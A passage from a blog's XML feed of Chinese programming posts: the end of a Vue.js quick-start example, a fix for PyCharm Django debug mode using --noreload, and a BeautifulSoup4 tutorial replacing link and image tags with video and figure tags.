class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script src=<span class="string">"https://cdn.staticfile.org/vue/2.2.2/vue.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">app1:hello Vue!</span></span><br><span class="line"><span class="regexp">&lt;div id="app1"&gt;</span></span><br><span class="line"><span class="regexp">  &#123;&#123; message &#125;&#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line">app2:v-html指令输出html代码</span><br><span class="line">&lt;div id=<span class="string">"app2"</span>&gt;</span><br><span class="line">    &lt;div v-html=<span class="string">"message"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;br&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">app3:v-bind指令绑定属性值</span></span><br><span class="line"><span class="regexp">&lt;div id="app3"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;a target="_blank" v-bind:href="url"&gt;click me go to myblog&lt;/</span>a&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;br&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">app4:v-band:class指令绑定样式</span></span><br><span class="line"><span class="regexp">&lt;div id="app4"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;div v-bind:class="&#123; 'active': isActive &#125;"&gt;&lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;br&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">app5:vue.js插值的javascript表达式支持</span></span><br><span class="line"><span class="regexp">&lt;div id="app5"&gt;</span></span><br><span class="line"><span class="regexp">    &#123;&#123;5+5&#125;&#125;&lt;br&gt;</span></span><br><span class="line"><span class="regexp">    &#123;&#123; ok ? 'YES' : 'NO' &#125;&#125;&lt;br&gt;</span></span><br><span class="line"><span class="regexp">    &#123;&#123; message.split('').reverse().join('') &#125;&#125;</span></span><br><span class="line"><span class="regexp">    &lt;div v-bind:id="'list-' + id"&gt;xiejava&lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;br&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">app6:v-if条件语句</span></span><br><span class="line"><span class="regexp">&lt;div id="app6"&gt;</span></span><br><span class="line"><span class="regexp">&lt;div v-if="ok"&gt;YES&lt;/</span>div&gt;</span><br><span class="line">&lt;div v-<span class="keyword">else</span>&gt;NO&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line">app7:<span class="keyword">for</span>循环语句</span><br><span class="line">&lt;div id=<span class="string">"app7"</span>&gt;</span><br><span class="line">  &lt;ol&gt;</span><br><span class="line">    &lt;li v-<span class="keyword">for</span>=<span class="string">"code in codes"</span>&gt;</span><br><span class="line">      &#123;&#123; code.name &#125;&#125;</span><br><span class="line">    &lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>ol&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;br&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">app8:v-on绑定事件</span></span><br><span class="line"><span class="regexp">&lt;div id="app8"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;button v-on:click="counter += 1"&gt;+1&lt;/</span>button&gt;</span><br><span class="line">  &lt;p&gt;加了 &#123;&#123; counter &#125;&#125; 次<span class="number">1</span>。&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="keyword">var</span> app1 = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app1'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    message: <span class="string">'Hello Vue!'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app2 = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app2'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    message: <span class="string">'&lt;b&gt;Hello Vue!&lt;/b&gt;'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app3 = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app3'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    url: <span class="string">'http://xiejava.ishareread.com/'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app4=<span class="keyword">new</span> Vue(</span><br><span class="line">&#123;</span><br><span class="line"> el: <span class="string">'#app4'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    isActive:<span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app5 = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app5'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    ok: <span class="literal">true</span>,</span><br><span class="line">    message: <span class="string">'XIEJAVA'</span>,</span><br><span class="line">    id : <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app6 = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line"> el:<span class="string">"#app6"</span>,</span><br><span class="line"> data:&#123;</span><br><span class="line"> ok:<span class="literal">false</span>,</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> app7=<span class="keyword">new</span> Vue(</span><br><span class="line">&#123;</span><br><span class="line"> el: <span class="string">'#app7'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    codes: [</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">'java'</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">'python'</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">'php'</span> &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app8=<span class="keyword">new</span> Vue(</span><br><span class="line">&#123;</span><br><span class="line"> el: <span class="string">'#app8'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    counter:<span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">.active &#123;</span></span><br><span class="line"><span class="regexp">width: 100px;</span></span><br><span class="line"><span class="regexp">height: 100px;</span></span><br><span class="line"><span class="regexp">background: red;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><p>通过上面的快速入门，基本了解什么是VUE、VUE的安装及基本的使用，常用的语法。后面还要更深入的学习VUE的组件、路由、后台接口调用等。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PyCharm在用Django开发时debug模式启动失败显示can&#39;t find &#39;__main__&#39; module的解决方法</title>
      <link href="/posts/aebdf141/"/>
      <url>/posts/aebdf141/</url>
      
        <content type="html"><![CDATA[<p>初次用Django开发web应用，在试图用Pycharm进行debug的时候，出现了一个奇怪的问题。以正常模式启动或者在terminal启动都没有问题。但是以debug模式启动时，显示<code>can&#39;t find &#39;__main__&#39; module”</code>报错。在网上找了很久都没有看到解决方法，最后在某乎上看到一篇文章，在启动时加上<code>--noreload</code>参数，既可以debug模式启动。</p><p><strong>报错信息：</strong><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220605/debug%E6%8A%A5%E9%94%99.png" alt="报错信息"><br><strong>解决方法：</strong><br>在启动时加上 <code>--noreload</code> 参数可以正常启动调试<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220605/--noreload.png" alt="加入不重新加载参数"></p><p>debug启动正常也可以调试了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220605/debug%E5%90%AF%E5%8A%A8%E6%AD%A3%E5%B8%B8.png" alt="debug正常启动"></p><p>踩过的坑记录一下，希望能帮到碰到同样问题的人。</p><p>感谢大佬的文章 <a href="https://zhuanlan.zhihu.com/p/443763989" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/443763989</a> </p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python使用BeautifulSoup4修改网页内容实战</title>
      <link href="/posts/1ca32c3a/"/>
      <url>/posts/1ca32c3a/</url>
      
        <content type="html"><![CDATA[<p>最近有个小项目，需要爬取页面上相应的资源数据后，保存到本地，然后将原始的HTML源文件保存下来，对HTML页面的内容进行修改将某些标签整个给替换掉。</p><p>对于这类需要对HTML进行操作的需求，最方便的莫过于<strong>BeautifulSoup4</strong>的库了。</p><p>样例的HTML代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"videoslide"</span> <span class="attr">href</span>=<span class="string">"http://www.test.com/wp-content/uploads/1020/1381824922.JPG"</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://www.test.com/wp-content/uploads/1020/1381824922_zy_compress.JPG"</span> <span class="attr">data-zy-media-id</span>=<span class="string">"zy_location_201310151613422786"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.test.com/wp-content/uploads/1020/第一张_1381824798.JPG"</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">img</span> <span class="attr">data-zy-media-id</span>=<span class="string">"zy_image_201310151613169945"</span> <span class="attr">src</span>=<span class="string">"http://www.test.com/wp-content/uploads/1020/第一张_1381824798_zy_compress.JPG"</span>/&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.test.com/wp-content/uploads/1020/第二张_1381824796.jpg"</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">img</span> <span class="attr">data-zy-media-id</span>=<span class="string">"zy_image_201310151613163009"</span> <span class="attr">src</span>=<span class="string">"http://www.test.com/wp-content/uploads/1020/第二张_1381824796_zy_compress.jpg"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.test.com/wp-content/uploads/1020/第三张.jpg"</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">img</span> <span class="attr">data-zy-media-id</span>=<span class="string">"zy_image_201312311838584446"</span> <span class="attr">src</span>=<span class="string">"http://www.test.com/wp-content/uploads/1020/第三张_zy_compress.jpg"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里主要包括了<code>&lt;a &gt;</code>标签，<code>&lt;a &gt;</code>标签里面嵌入了<code>&lt;img &gt;</code>标签，其中有<code>&lt;a class=&quot;videoslide&quot;&gt;</code>的标识该标签实际是可以播放动画的。需要根据<code>class=&quot;videoslide&quot;</code> 来判断将整个<code>&lt;a &gt;</code>标签换成播放器的<code>&lt;video &gt;</code>标签，将没有<code>class=&quot;videoslide&quot;</code> 的<code>&lt;a &gt;</code>标签换成<code>&lt;figure&gt;</code>标签。</p><p>也就是将带有的<code>&lt;a class=&quot;videoslide&quot; ...&gt;&lt;img ... /&gt;&lt;/a&gt;</code>标签换成 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"video"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">poster</span>=<span class="string">"视频链接的图片地址.jpg"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"视频文件的静态地址.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span> /&gt;</span></span><br><span class="line">    您的浏览器不支持H5视频，请使用Chrome/Firefox/Edge浏览器。</span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将<code>&lt;a ....&gt;&lt;img .../&gt;&lt;/a&gt;</code>标签换成</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">figure</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt; <span class="attr">img</span> <span class="attr">src</span>=<span class="string">"图片地址_compressed.jpg"</span> <span class="attr">data-zy-media-id</span>=<span class="string">"图片地址.jpg"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">figcaption</span>&gt;</span>文字说明（如果有）<span class="tag">&lt;/<span class="name">figcaption</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">figure</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里通过BeautifulSoup4 的select()方法找到标签，通过get()方法获取标签及标签属性值，通过replaceWith来替换标签，具体代码如下：<br>首先安装BeautifulSoup4的库，BeautifulSoup4库依赖于lxml库，所以也需要安装lxml库。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install bs4</span><br><span class="line">pip install lxml</span><br></pre></td></tr></table></figure><p>具体代码实现如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">htmlstr=<span class="string">'&lt;html&gt;&lt;body&gt;'</span> \</span><br><span class="line">        <span class="string">'&lt;a class="videoslide" href="http://www.test.com/wp-content/uploads/1020/1381824922.JPG"&gt;'</span> \</span><br><span class="line">        <span class="string">'&lt;img src="http://www.test.com/wp-content/uploads/1020/1381824922_zy_compress.JPG" data-zy-media-id="zy_location_201310151613422786"/&gt;&lt;/a&gt;'</span> \</span><br><span class="line">        <span class="string">'&lt;a href="http://www.test.com/wp-content/uploads/1020/第一张_1381824798.JPG"&gt;'</span> \</span><br><span class="line">        <span class="string">'&lt;img data-zy-media-id="zy_image_201310151613169945" src="http://www.test.com/wp-content/uploads/1020/第一张_1381824798_zy_compress.JPG"/&gt;&lt;/a&gt;'</span> \</span><br><span class="line">        <span class="string">'&lt;a href="http://www.test.com/wp-content/uploads/1020/第二张_1381824796.jpg"&gt;'</span> \</span><br><span class="line">        <span class="string">'&lt;img data-zy-media-id="zy_image_201310151613163009" src="http://www.test.com/wp-content/uploads/1020/第二张_1381824796_zy_compress.jpg"/&gt;&lt;/a&gt;'</span> \</span><br><span class="line">        <span class="string">'&lt;a href="http://www.test.com/wp-content/uploads/1020/第三张.jpg"&gt;'</span> \</span><br><span class="line">        <span class="string">'&lt;img data-zy-media-id="zy_image_201312311838584446" src="http://www.test.com/wp-content/uploads/1020/第三张_zy_compress.jpg"/&gt;&lt;/a&gt;'</span> \</span><br><span class="line">        <span class="string">'&lt;/body&gt;&lt;/html&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">procHtml</span><span class="params">(htmlstr)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(htmlstr, <span class="string">'lxml'</span>)</span><br><span class="line">    a_tags=soup.select(<span class="string">'a'</span>)</span><br><span class="line">    <span class="keyword">for</span> a_tag <span class="keyword">in</span> a_tags:</span><br><span class="line">        a_tag_src = a_tag.get(<span class="string">'href'</span>)</span><br><span class="line">        a_tag_filename = os.path.basename(a_tag_src)</span><br><span class="line">        a_tag_path = os.path.join(<span class="string">'src'</span>, a_tag_filename)</span><br><span class="line">        a_tag[<span class="string">'href'</span>]=a_tag_path</span><br><span class="line">        next_tag=a_tag.next</span><br><span class="line">        <span class="comment">#判断是视频还是图片，如果a标签带了class="videoslide" 是视频否则是图片</span></span><br><span class="line">        <span class="keyword">if</span> a_tag.get(<span class="string">'class'</span>) <span class="keyword">and</span> <span class="string">'videoslide'</span>==a_tag.get(<span class="string">'class'</span>)[<span class="number">0</span>]:</span><br><span class="line">            <span class="comment"># 处理视频文件</span></span><br><span class="line">            media_id = next_tag.get(<span class="string">'data-zy-media-id'</span>)</span><br><span class="line">            <span class="keyword">if</span> media_id:</span><br><span class="line">                media_url = <span class="string">'http://www.test.com/travel/show_media/'</span> + str(media_id)+<span class="string">'.mp4'</span></span><br><span class="line">                media_filename = os.path.basename(media_url)</span><br><span class="line">                media_path = os.path.join(<span class="string">'src'</span>, media_filename)</span><br><span class="line">                <span class="comment"># 将div.video标签替换a标签</span></span><br><span class="line">                video_html = <span class="string">'&lt;div class=\"video\"&gt;&lt;video controls width = \"100%\" poster = \"'</span> + a_tag_path + <span class="string">'\" &gt;&lt;source src = \"'</span> + media_path + <span class="string">'\" type = \"video/mp4\" /&gt; 您的浏览器不支持H5视频，请使用Chrome / Firefox / Edge浏览器。 &lt;/video&gt;&lt;/div&gt;'</span></span><br><span class="line">                video_soup = BeautifulSoup(video_html, <span class="string">'lxml'</span>)</span><br><span class="line">                a_tag.replaceWith(video_soup.div)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#获取图片信息</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'img'</span>==next_tag.name:</span><br><span class="line">                img_src=next_tag.get(<span class="string">'src'</span>)</span><br><span class="line">                <span class="comment"># 判断是否路径是否为本地资源 data:image和file:</span></span><br><span class="line">                <span class="keyword">if</span> img_src.find(<span class="string">'data:image'</span>) == <span class="number">-1</span> <span class="keyword">and</span> img_src.find(<span class="string">'file:'</span>) == <span class="number">-1</span>:</span><br><span class="line">                    img_filename = os.path.basename(img_src)</span><br><span class="line">                    img_path = os.path.join(<span class="string">'src'</span>, img_filename)</span><br><span class="line">                    <span class="comment"># 将&lt;figure&gt;&lt;img&gt;标签替换a标签</span></span><br><span class="line">                    figcaption=<span class="string">''</span></span><br><span class="line">                    figure_html=<span class="string">'&lt;figure&gt;&lt;img src=\"'</span>+img_path+<span class="string">'\" data-zy-media-id=\"'</span>+a_tag_path+<span class="string">'\"&gt;&lt;figcaption&gt;'</span>+figcaption+<span class="string">'&lt;/figcaption&gt;&lt;/figure&gt;'</span></span><br><span class="line">                    figure_soup = BeautifulSoup(figure_html, <span class="string">'lxml'</span>)</span><br><span class="line">                    a_tag.replaceWith(figure_soup.figure)</span><br><span class="line">    html_content = soup.contents[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> html_content</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pro_html_str=procHtml(htmlstr)</span><br><span class="line">    print(pro_html_str)</span><br></pre></td></tr></table></figure><p>结果:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"video"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span>=<span class="string">""</span> <span class="attr">poster</span>=<span class="string">"src\1381824922.JPG"</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"src\zy_location_201310151613422786.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>/&gt;</span> 您的浏览器不支持H5视频，请使用Chrome / Firefox / Edge浏览器。 </span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">figure</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">data-zy-media-id</span>=<span class="string">"src\第一张_1381824798.JPG"</span> <span class="attr">src</span>=<span class="string">"src\第一张_1381824798_zy_compress.JPG"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">figcaption</span>&gt;</span><span class="tag">&lt;/<span class="name">figcaption</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">figure</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">figure</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">data-zy-media-id</span>=<span class="string">"src\第二张_1381824796.jpg"</span> <span class="attr">src</span>=<span class="string">"src\第二张_1381824796_zy_compress.jpg"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">figcaption</span>&gt;</span><span class="tag">&lt;/<span class="name">figcaption</span>&gt;</span><span class="tag">&lt;/<span class="name">figure</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">figure</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">data-zy-media-id</span>=<span class="string">"src\第三张.jpg"</span> <span class="attr">src</span>=<span class="string">"src\第三张_zy_compress.jpg"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">figcaption</span>&gt;</span><span class="tag">&lt;/<span class="name">figcaption</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">figure</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全设备-认识运维安全管理与审计系统（堡垒机）</title>
      <link href="/posts/9c723d09/"/>
      <url>/posts/9c723d09/</url>
      
